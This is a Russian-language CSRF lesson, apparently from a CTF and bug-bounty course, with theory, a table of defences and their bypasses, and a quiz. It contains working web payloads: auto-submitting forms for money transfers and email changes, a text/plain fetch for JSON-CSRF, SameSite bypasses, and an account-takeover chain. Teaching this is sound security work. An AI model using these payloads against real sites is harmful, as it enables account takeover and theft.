---
id: web-csrf
title: "CSRF: подделка межсайтовых запросов"
category: web
parent: web-auth-core
difficulty: medium
order: 1
tags: [csrf, samesite, token, cross-site, state-changing]
prerequisites: [web-auth-jwt-idor, web-cookies-sessions]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Как заставить браузер жертвы выполнить действие, обойти SameSite и токены, и как это доказать."
---

CSRF (Cross-Site Request Forgery) — это когда чужой сайт заставляет браузер жертвы отправить запрос к вашему сайту, и тот выполняется **от имени жертвы** (с её cookie). Ключевое отличие от XSS: при XSS код исполняется на самом уязвимом сайте, а при CSRF — на стороннем, но запрос уходит на уязвимый с автоматически приложенными cookie. CSRF опасен для любых действий, меняющих состояние: смена пароля/email, перевод денег, смена настроек.

## Теория: почему это работает

Браузер автоматически прикладывает cookie к запросу к домену, независимо от того, какая страница его инициировала. Поэтому если у вас есть `<form action="https://bank.com/transfer" method="POST">`, а жертва залогинена в `bank.com`, то при отправке формы уйдёт запрос с её сессией.

Условия успешной CSRF-атаки:
1. Действие меняет состояние (не просто чтение).
2. Аутентификация основана на **автоматически отправляемых** данных (cookie, HTTP Basic, TLS client cert).
3. Приложение не отличает «свой» запрос от «чужого» (нет CSRF-токена/проверки Origin).
4. У атакующего есть способ заставить жертву отправить запрос (ссылка, форма, `<img>`, auto-submit).

Токены в `Authorization`-заголовке (Bearer) **не** отправляются автоматически → API на токенах обычно CSRF-неуязвим (но если токен в cookie — уязвим).

## Теория: защита и её обход

Защита бывает такой:
- **CSRF-токен** (synchronizer token) — скрытое поле/заголовок, привязанный к сессии. Обходится при XSS (токен читается) или если токен не проверяется/не привязан к пользователю.
- **`SameSite` cookie** — `Lax`/`Strict` мешают кросс-сайтовым POST. Обходится: `Lax` пропускает top-level **GET**-навигацию; иногда меняют метод на GET, где действие по GET — баг сам по себе.
- **Проверка `Origin`/`Referer`** — можно обойти при открытом редиректе (Referer становится доверенным) или если заголовок отсутствует и сервер «доверяет» без него.
- **Double-submit cookie** — токен в cookie и в теле; обходится при cookie-injection с поддомена.
- **Кастомные заголовки** (`X-Requested-With`) — обходятся через CORS-мисконфиг.

## Инструменты: генерация PoC

Простейший PoC — авто-отправляющаяся форма:

```html
<html><body onload="document.forms[0].submit()">
<form action="https://bank.local/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>
</body></html>
```

GET-вариант (для действий по GET):

```html
<img src="https://bank.local/settings?email=attacker@evil.com">
```

Проверить, требует ли сервер токен:

```bash
curl -s -i -X POST https://bank.local/transfer -b 'session=victim' \
  -d 'to=attacker&amount=1000'
```

Если `200`/`302` и действие выполнено без токена — CSRF есть.

Проверить поведение `SameSite`:

```bash
# без Origin/Referer
curl -s -o /dev/null -w '%{http_code}\n' -X POST https://bank.local/transfer -b 'session=victim' -d 'to=x&amount=1'
# с чужим Origin
curl -s -o /dev/null -w '%{http_code}\n' -X POST https://bank.local/transfer \
  -H 'Origin: https://evil.com' -b 'session=victim' -d 'to=x&amount=1'
```

Если оба проходят → защита отсутствует. В **Burp** есть встроенный генератор CSRF PoC (правый клик → *Engagement tools → Generate CSRF PoC*).

## Разобранный пример: CSRF на смену email → захват аккаунта

Шаг 1. Находим эндпоинт смены email:

```bash
curl -s -i -X POST https://app.local/settings/email -b 'session=victim' \
  -H 'Content-Type: application/x-www-form-urlencoded' -d 'email=new@x.com'
# 200 OK, email изменён, токен не требовался
```

Шаг 2. Проверяем, есть ли проверка Origin:

```bash
curl -s -i -X POST https://app.local/settings/email -b 'session=victim' \
  -H 'Origin: https://evil.com' -d 'email=new@x.com'
# 200 OK — Origin не проверяется
```

Шаг 3. Строим PoC-страницу и открываем в браузере, где залогинены:

```html
<form action="https://app.local/settings/email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

Шаг 4. После смены email злоумышленник запрашивает сброс пароля → получает письмо на свой ящик → **захват аккаунта**. Это полный impact-цепочка, которую надо описать в отчёте.

## Разобранный пример: обход SameSite=Lax через метод-оверрайд

Иногда действие защищено только POST, но приложение поддерживает `_method=GET` или `X-HTTP-Method-Override`. При `SameSite=Lax` top-level GET-переходы разрешены, поэтому:

```html
<a href="https://app.local/settings/email?email=attacker@evil.com&_method=POST">click</a>
```

Если сервер уважает `_method`, GET-переход выполнит POST-действие в обход `Lax`.

## Частые ошибки

- **Путать CSRF и XSS.** XSS сильнее и часто позволяет обойти CSRF-защиту; это разные классы.
- **Тестировать без сессии.** CSRF проявляется только с валидной cookie жертвы; используйте свой аккаунт.
- **Считать `SameSite=Lax` полной защитой.** GET-действия и метод-оверрайды обходят его.
- **Забывать про state-changing GET.** Любое действие по GET — сам по себе баг и идеальный CSRF-вектор.
- **Не проверять наличие токена по факту.** Иногда токен есть в форме, но сервер его не проверяет — уберите и попробуйте.
- **Игнорировать API.** JSON-API с cookie-аутентификацией тоже уязвим; проверяйте `Content-Type: text/plain` (простой запрос без preflight).

## Полный разбор: JSON-CSRF и обход Content-Type (с выводом)

Многие считают, что JSON-API «не уязвим к CSRF», потому что требует `Content-Type: application/json` и вызывает preflight. Это неверно: если сервер парсит тело независимо от `Content-Type`, можно отправить «простой» запрос без preflight.

Шаг 1. Проверяем, принимает ли API тело с `text/plain`:

```bash
curl -s -i -X POST https://api.local/user/email -b 'session=victim' \
  -H 'Content-Type: text/plain' -d '{"email":"attacker@evil.com"}'
# HTTP/1.1 200 OK
# {"ok":true}   -> Content-Type не проверяется, preflight не нужен
```

Шаг 2. Строим PoC через `fetch` с `text/plain` (простой запрос, без preflight):

```html
<script>
fetch('https://api.local/user/email', {
  method:'POST',
  credentials:'include',
  headers:{'Content-Type':'text/plain'},
  body:'{"email":"attacker@evil.com"}'
});
</script>
```

Браузер отправит запрос с cookie жертвы, preflight не будет (тип `text/plain` — «простой»), сервер распарсит JSON → email изменён. Это полноценный CSRF на JSON-API.

Шаг 3. Если сервер требует `application/json`, попробуйте:
- `Content-Type: application/x-www-form-urlencoded` с JSON-строкой в теле;
- form-encoded параметры (`email=...`), если сервер принимает оба формата;
- multipart/form-data (тоже «простой», без preflight) через `<form enctype="multipart/form-data">`.

## Reference-таблица: защиты от CSRF и их обходы

| Защита | Как работает | Обход |
|--------|--------------|-------|
| CSRF-токен (synchronizer) | токен в поле/заголовке, привязан к сессии | XSS для чтения токена; токен не проверяется/не привязан |
| SameSite=Lax | cookie только top-level GET | state-changing GET, `_method`-override, redirect |
| SameSite=Strict | cookie только same-site | редко обходится; ищите исключения |
| Origin/Referer check | сверка источника | open redirect делает Referer доверенным; отсутствие заголовка |
| Double-submit cookie | токен в cookie и в теле | cookie injection с поддомена |
| Custom header (`X-Requested-With`) | требуется заголовок | CORS-мисконфиг разрешает его |
| Re-auth (пароль) | требует ввод пароля | не обходится — правильная защита |
| CAPTCHA | требует решения | не обходится автоматически |

## SameSite: точная семантика и обходы

- **`None`:** cookie шлётся всегда (нужен `Secure`) → CSRF полностью возможен.
- **`Lax` (по умолчанию в Chrome):** cookie при **top-level** навигации методом GET; при POST из `<form>` — **не** шлётся. Обходы:
  - `_method=POST`/`X-HTTP-Method-Override` при GET-переходе;
  - «двухшаговый» CSRF: сначала top-level GET ставит что-то, потом same-site запрос;
  - **Lax+POST** grace-period: свежепоставленные cookie (в течение ~2 минут) в Chrome всё ещё шлются при top-level POST.
- **`Strict`:** cookie не шлётся при кросс-сайт-навигации вообще; обходится редко — через клиентские редиректы/«вылет» из браузера.
- **`Secure`:** только по HTTPS; не влияет на CSRF напрямую.
- **`__Host-` префикс:** привязка cookie к хосту (без domain) — мешает cookie injection с поддомена.

Проверить атрибуты:

```bash
curl -s -I https://app.local/login | grep -i 'set-cookie'
# set-cookie: session=...; Path=/; HttpOnly; Secure; SameSite=Lax
```

## CSRF на API и GraphQL

- **REST на cookie:** проверяйте все state-changing методы (`POST/PUT/DELETE/PATCH`) и `Content-Type`-обходы.
- **GraphQL:** мутации по GET (`?query=mutation{...}`) — некоторые серверы разрешают, а GET-мутация идеальна для CSRF; также проверьте `application/x-www-form-urlencoded`-обёртку.
- **WebSocket:** браузер шлёт cookie при handshake с того же origin; если сервер не проверяет `Origin`, возможен CSWSH (Cross-Site WebSocket Hijacking). PoC — `new WebSocket('wss://target/ws')` с чужого сайта.
- **Формы-загрузки:** `multipart/form-data` через `<form>` — простой запрос без preflight.

## Что делать дальше / решение

1. **Найти state-changing эндпоинты** (смена email/пароля, перевод, настройки).
2. **Воспроизвести без токена** со своим cookie; проверить, применилось ли действие.
3. **Проверить Origin/Referer** — шлётся ли запрос с чужим `Origin`.
4. **Учесть SameSite** — `Lax` обходится GET/`_method`/grace-period.
5. **Собрать PoC** (авто-submit форма, `<img>`, `fetch` text/plain).
6. **Доказать impact-цепочку** (смена email → сброс пароля → ATO), тестируя на своём аккаунте.
7. **Проверить WebSocket/GraphQL** отдельно — там свои нюансы.

## CSRF vs SameSite: чек-лист тестирования

Пошаговый алгоритм проверки конкретного действия:

1. **Определить метод и Content-Type:** POST form-urlencoded, JSON, multipart, GET.
2. **Воспроизвести без токена:** убрать CSRF-поле/заголовок, отправить со своим cookie. Действие применилось?
3. **Проверить `Origin`/`Referer`:** подставить чужой `Origin`; если проходит — нет проверки источника.
4. **Проверить cookie-атрибуты:** `SameSite` (`None`/`Lax`/`Strict`), `Secure`, `HttpOnly`, префикс `__Host-`.
5. **Учесть `Lax`-исключения:** top-level GET, `_method`/`X-HTTP-Method-Override`, Lax+POST grace-period (~2 мин).
6. **Проверить JSON-CSRF:** `Content-Type: text/plain`/`application/x-www-form-urlencoded` без preflight.
7. **Проверить WebSocket:** handshake с чужого origin при отсутствии проверки `Origin` (CSWSH).
8. **Построить PoC** (авто-submit форма / `<img>` / `fetch`) и подтвердить на своём аккаунте.

Матрица быстрых выводов:

| Признак | Вывод |
|---------|-------|
| Нет токена + `SameSite=None` | классический CSRF |
| Нет токена + `SameSite=Lax`, действие по GET | обход через top-level GET |
| Есть токен, но не проверяется | CSRF всё равно есть |
| `Authorization: Bearer` из заголовка | не CSRF (не шлётся автоматически) |
| Проверка `Origin` строгая | CSRF закрыт (если нет open redirect) |

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Чем CSRF отличается от XSS?"
  options:
    - "CSRF исполняет JS на уязвимом сайте"
    - "CSRF заставляет браузер жертвы отправить запрос с её cookie, а код живёт на другом сайте"
    - "CSRF не связан с cookie"
    - "Это одно и то же"
  answer: 1
  explanation: "При CSRF полезная нагрузка на стороннем сайте, но запрос уходит на уязвимый с cookie жертвы."
- question: "Какой механизм аутентификации обычно НЕ уязвим к классическому CSRF?"
  options:
    - "Cookie-сессия"
    - "HTTP Basic Auth"
    - "Bearer-токен в заголовке `Authorization`"
    - "mTLS"
  answer: 2
  explanation: "Bearer-токен не отправляется браузером автоматически, поэтому чужой сайт его не приложит."
- question: "Что делает `SameSite=Lax`?"
  options:
    - "Полностью блокирует cookie в кросс-сайтовых запросах"
    - "Разрешает cookie при top-level GET-навигации, но не при кросс-сайтовых POST"
    - "Отключает HTTPS"
    - "Делает cookie доступной из JS"
  answer: 1
  explanation: "`Lax` — компромисс; поэтому опасны state-changing GET."
- question: "Как подтвердить CSRF на смене email?"
  options:
    - "Запустить сканер"
    - "Отправить POST без CSRF-токена со своим cookie и проверить, что значение изменилось"
    - "Проверить `robots.txt`"
    - "Посмотреть заголовок `Server`"
  answer: 1
  explanation: "Нужно воспроизвести действие без токена и убедиться, что оно применилось."
- question: "Почему XSS помогает обойти CSRF-токен?"
  options:
    - "Токен хранится на сервере"
    - "JS может прочитать токен из DOM/запроса и подставить его"
    - "XSS отключает SameSite"
    - "Токен не нужен"
  answer: 1
  explanation: "При XSS вы исполняете код на сайте и можете достать токен."
```

## Где пригодится

- **CTF (Web):** CSRF-задачи часто совмещены с XSS и требуют полной цепочки «смена email → сброс пароля → флаг».
- **Bug bounty:** CSRF на чувствительных действиях (email, пароль, платёж) — валидная находка с высоким impact.
- **Пентест:** CSRF — обязательный пункт чек-листа веб-приложения, особенно с cookie-сессиями.
- **Работа (AppSec/Dev):** внедрение CSRF-токенов и `SameSite` — базовая защита, которую вы будете ревьюить.
